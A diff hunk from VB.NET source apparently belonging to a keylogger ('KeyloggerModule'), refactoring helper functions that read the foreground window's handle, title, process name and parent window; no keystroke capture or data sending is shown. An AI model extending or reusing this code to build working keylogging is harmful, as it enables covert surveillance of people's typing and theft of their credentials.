@@ -357,23 +357,23 @@ Namespace KeyloggerModule
         End Function
 
         Function getWindowHandle() As IntPtr
-            Return Class1.getForegroundWindow()
+            Return Utils.getForegroundWindow()
         End Function
         Function getWindowTitle() As String
-            Dim ptr As IntPtr = Class1.getForegroundWindow()
+            Dim ptr As IntPtr = Utils.getForegroundWindow()
             If ptr = 0 Then Return "Window handle zero"
-            Dim len = Class1.GetWindowTextLength(ptr) + 1
+            Dim len = Utils.GetWindowTextLength(ptr) + 1
             Dim title As String = Space(len)
-            Class1.GetWindowText(ptr, title, len)
+            Utils.GetWindowText(ptr, title, len)
             title = title.Replace(vbNullChar, "")
             Return title
         End Function
 
         Function getWindowProcessName() As String
-            Dim ptr As IntPtr = Class1.getForegroundWindow()
+            Dim ptr As IntPtr = Utils.getForegroundWindow()
             If ptr = 0 Then Return "Window handle zero"
             Dim threadId As Integer
-            Class1.GetWindowThreadProcessId(ptr, threadId)
+            Utils.GetWindowThreadProcessId(ptr, threadId)
             Dim process As Process
             Try
                 process = Process.GetProcessById(threadId)
@@ -384,7 +384,7 @@ Namespace KeyloggerModule
         End Function
 
         Function getParent(ptr As IntPtr) As IntPtr
-            Dim parent As IntPtr = Class1.GetParent(ptr)
+            Dim parent As IntPtr = Utils.GetParent(ptr)
             If parent = 0 Then
                 Return ptr
             Else
